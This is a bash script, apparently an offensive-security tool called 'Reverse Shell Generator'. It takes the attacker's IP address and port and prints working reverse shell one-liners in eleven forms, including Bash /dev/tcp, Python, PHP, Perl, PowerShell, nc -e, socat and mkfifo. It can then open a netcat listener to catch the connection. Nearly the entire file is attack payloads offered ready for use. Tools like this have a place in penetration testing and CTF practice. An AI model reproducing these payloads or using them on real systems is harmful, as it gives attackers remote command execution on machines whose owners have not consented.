#! /bin/bash

function activateListener {

printf "open nc listener? Y/N \n\n"
printf "> "
read openlisten

if [ "$openlisten" == 'y' ] || [ "$openlisten" == 'Y' ]; then
    printf "netcat listener opened\n\n"
    nc -lvnp $listenPort
else
    printf "no netcat listener opened\n\n"
fi }

pyfiglet "Reverse Shell Generator"
printf "By DrXploiter - Version 1.5"

                                                    
 

printf "\nSpecify attacker's interface or IP\n"
printf "> "

read ip_or_int

case $ip_or_int in
  eth0)

  attackerIP=$(ip -4 addr show eth0 | grep -oP '(?<=inet\s)\d+(\.\d+){3}');;


  tun0)
  printf "you picked tun0\n"
  attackerIP=$(ip -4 addr show tun0 | grep -oP '(?<=inet\s)\d+(\.\d+){3}');;
 
  
  *)
  printf "you picked an IP address\n"
  attackerIP=$ip_or_int;;
 
  

esac  


printf "Specify attacker's listening port\n"
printf "> "

read listenPort
printf "\n"





printf "What shell type do you wish to generate?"
printf "
------------------
1)  PHP          | 
------------------
2)  Python       |
------------------
3)  Bash         |
------------------
4)  Perl         |
------------------
5)  Powershell   |
------------------
6)  Ruby         |
------------------
7)  Java         |
------------------
8)  Netcat       |
------------------
9)  xterm        |
------------------
10) socat        |
------------------
11) mkfifo       |
------------------
a) all shells    |
------------------\n"


printf "> "
read shellopt #shell option

case $shellopt in
  1)
  printf "Generated PHP shell....\n\n"
  printf "php -r \'\$sock=fsockopen(\"$attackerIP\",$listenPort);exec(\"/bin/sh -i <&3 >&3 2>&3\");'\n\n"
  activateListener;;

  2)
  printf "Generated Python shell....\n\n"
  printf "python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$attackerIP\",$listenPort));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);\'\n\n"
  activateListener;;

  3)
  printf "Generated Bash shell....\n\n"
  printf "bash -i >& /dev/tcp/$attackerIP/$listenPort 0>&1\n"
  printf "or...\n"
  printf "0<&196;exec 196<>/dev/tcp/$attackerIP/$listenPort; sh <&196 >&196 2>&196\n\n"
  activateListener;;
  
  4)
  printf "Generated Perl shell....\n\n"
    printf "perl -e \'use Socket;\$i=\"$attackerIP\";\$p=$listenPort;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};\'\n\n"
    activateListener;;

  
  5)
  printf "Generated Powershell shell....\n\n\n"
  printf "powershell -c \"\$client = New-Object System.Net.Sockets.TCPClient(\'$attackerIP\',$listenPort);\$stream = \$client.GetStream();[byte[]]\$bytes = 0..65535|%%{0};while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){;\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i);\$sendback = (iex \$data 2>&1 | Out-String );\$sendback2 = \$sendback + \'PS \' + (pwd).Path + \'> \';\$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()};\$client.Close()\"\n\n"
  activateListener;;
  
  6)
  printf "Generated Ruby shell....\n\n"
  printf "ruby -rsocket -e\'f=TCPSocket.open(\"$attackerIP\",$listenPort).to_i;exec sprintf(\"/bin/sh -i <&%%d >&%%d 2>&%%d\",f,f,f)\'\n\n"
  activateListener;;
  
  7)
  printf "Generated Java shell....\n\n"
  printf "r = Runtime.getRuntime()
p = r.exec([\"/bin/bash\",\"-c\",\"exec 5<>/dev/tcp/$attackerIP/$listenPort;cat <&5 | while read line; do \\\$line 2>&5 >&5; done\"] as String[])
p.waitFor()\n\n"
activateListener;;

  8)
  printf "Generated netcat shell....\n\n"
  printf "nc -e /bin/sh $attackerIP $listenPort\n\n"
  activateListener;;
  
  9)
  printf "Generated xterm shell....\n\n"
  printf "xterm -display $attackerIP:$listenPort\n\n"
  activateListener;;
  
  10)
  printf "Generated socat shell....\n\n"
  printf "socat TCP:$attackerIP:$listenPort EXEC:\"bash -li\",pty,stderr,sigint,setsid,sane\n\n"
  activateListener;;
  
  11)
  printf "Generated mkfifo\n\n"
  printf "mkfifo /tmp/f; nc $attackerIP $listenPort < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f\n\n"
  activateListener;;
  
  a)
  printf "Generated all shells  (to be finilized)\n\n"
  printf "
-----------------------
PHP          php -r \'\$sock=fsockopen(\"$attackerIP\",$listenPort);exec(\"/bin/sh -i <&3 >&3 2>&3\");'         
-----------------------
Python       python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$attackerIP\",$listenPort));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);\'  
------------------
Bash         bash -i >& /dev/tcp/$attackerIP/$listenPort 0>&1 --Or-- 0<&196;exec 196<>/dev/tcp/$attackerIP/$listenPort; sh <&196 >&196 2>&196        
------------------
Perl         perl -e \'use Socket;\$i=\"$attackerIP\";\$p=$listenPort;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};\'            
------------------
Powershell   powershell -c \"\$client = New-Object System.Net.Sockets.TCPClient(\'$attackerIP\',$listenPort);\$stream = \$client.GetStream();[byte[]]\$bytes = 0..65535|%%{0};while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){;\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i);\$sendback = (iex \$data 2>&1 | Out-String );\$sendback2 = \$sendback + \'PS \' + (pwd).Path + \'> \';\$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()};\$client.Close()\       
------------------
Ruby         ruby -rsocket -e\'f=TCPSocket.open(\"$attackerIP\",$listenPort).to_i;exec sprintf(\"/bin/sh -i <&%%d >&%%d 2>&%%d\",f,f,f)\'         
------------------
Java        r = Runtime.getRuntime()
p = r.exec([\"/bin/bash\",\"-c\",\"exec 5<>/dev/tcp/$attackerIP/$listenPort;cat <&5 | while read line; do \\\$line 2>&5 >&5; done\"] as String[])
p.waitFor()  
------------------
Netcat      nc -e /bin/sh $attackerIP $listenPort    
------------------
xterm       xterm -display $attackerIP:$listenPort      
------------------
socat       socat TCP:$attackerIP:$listenPort EXEC:\"bash -li\",pty,stderr,sigint,setsid,sane    
------------------
mkfifo      mkfifo /tmp/f; nc $attackerIP $listenPort < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f    
------------------
\n"

activateListener;;
  
  *)
  printf "Error. Invalid option\n"
 
 ;;
 esac 

